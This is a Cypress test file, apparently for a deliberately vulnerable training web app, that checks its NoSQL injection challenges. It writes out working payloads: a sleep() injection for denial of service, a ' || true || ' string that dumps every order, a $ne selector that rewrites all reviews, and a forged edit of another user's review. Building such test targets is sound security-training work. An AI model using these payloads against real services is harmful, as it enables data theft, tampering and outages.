describe('/rest/products/reviews', () => {
  beforeEach(() => {
    cy.visit('/#/search')
  })

  describe('challenge "NoSQL DoS"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })
    it('should be possible to inject a command into the get route', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.window().then(() => {
            void fetch(
              `${Cypress.config('baseUrl')}/rest/products/sleep(1000)/reviews`,
              {
                method: 'GET',
                headers: {
                  'Content-type': 'text/plain'
                }
              }
            )
          })
          cy.expectChallengeSolved({ challenge: 'NoSQL DoS' })
        }
      })
    })
  })

  describe('challenge "NoSQL Exfiltration"', () => {
    it('should be possible to inject and get all the orders', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.window().then(async () => {
            await fetch(
              `${Cypress.config('baseUrl')}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27`,
              {
                method: 'GET',
                headers: {
                  'Content-type': 'text/plain'
                }
              }
            )
          })
          cy.expectChallengeSolved({ challenge: 'NoSQL Exfiltration' })
        }
      })
    })
  })

  describe('challenge "NoSQL Manipulation"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })

    it('should be possible to inject a selector into the update route', () => {
      cy.window().then(async () => {
        await fetch(`${Cypress.config('baseUrl')}/rest/products/reviews`, {
          method: 'PATCH',
          headers: {
            'Content-type': 'application/json',
            Authorization: `Bearer ${localStorage.getItem('token')}`
          },
          body: JSON.stringify({
            id: { $ne: -1 },
            message: 'NoSQL Injection!'
          })
        })
      })
      cy.expectChallengeSolved({ challenge: 'NoSQL Manipulation' })
    })
  })

  describe('challenge "Forged Review"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should be possible to edit any existing review', () => {
      cy.visit('/')
      cy.window().then(async () => {
        const response = await fetch(
          `${Cypress.config('baseUrl')}/rest/products/1/reviews`,
          {
            method: 'GET',
            headers: {
              'Content-type': 'text/plain'
            }
          }
        )
        if (response.status === 200) {
          const responseJson = await response.json()
          const reviewId = responseJson.data[0]._id
          await editReview(reviewId)
        }

        async function editReview (reviewId: string) {
          const response = await fetch(
            `${Cypress.config('baseUrl')}/rest/products/reviews`,
            {
              method: 'PATCH',
              headers: {
                'Content-type': 'application/json',
                Authorization: `Bearer ${localStorage.getItem('token')}`
              },
              body: JSON.stringify({ id: reviewId, message: 'injected' })
            }
          )
          if (response.status === 200) {
            console.log('Success')
          }
        }
      })
      cy.expectChallengeSolved({ challenge: 'Forged Review' })
    })
  })

  describe('challenge "Multiple Likes"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should not be possible to like reviews multiple times', () => {
      cy.visit('/')
      cy.request('/rest/products/1/reviews').then((response) => {
        const review = response.body.data[0]
        cy.window().then(async () => {
          const token = localStorage.getItem('token')
          const statuses = await Promise.all([1, 2, 3].map(async () => (await fetch(
            `${Cypress.config('baseUrl')}/rest/products/reviews`,
            {
              method: 'POST',
              headers: { 'Content-type': 'application/json', Authorization: `Bearer ${token}` },
              body: JSON.stringify({ id: review._id })
            }
          )).status))
          expect(statuses.filter(status => status === 200)).to.have.length(1)
          expect(statuses.filter(status => status === 403)).to.have.length(2)
        })
        cy.request('/rest/products/1/reviews').then((after) => {
          const updated = after.body.data.find((r: { _id: string }) => r._id === review._id)
          expect(updated.likesCount).to.eq(review.likesCount + 1)
        })
        cy.request('/api/Challenges/?name=Multiple Likes').its('body.data.0.solved').should('eq', false)
      })
    })
  })
})
